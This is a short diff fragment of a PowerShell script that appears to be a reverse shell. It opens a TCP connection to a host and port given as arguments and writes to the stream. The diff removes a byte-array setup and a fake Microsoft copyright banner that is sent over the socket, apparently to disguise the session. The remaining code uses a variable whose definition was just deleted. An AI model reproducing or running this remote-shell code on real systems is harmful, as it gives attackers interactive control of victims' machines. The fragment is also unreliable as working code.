@@ -5,9 +5,7 @@
 $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 # Create a client stream to read and write to the connection
 $I = $c.GetStream();
-# Creating a byte array to allow for space for 
-[byte[]]$U = 0..(2-shl15)|%{0};
-$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
+
 # Writing output to client stream 
 $I.Write($U,0,$U.Length)
 # Get location of Path Directory and encode in ASCII
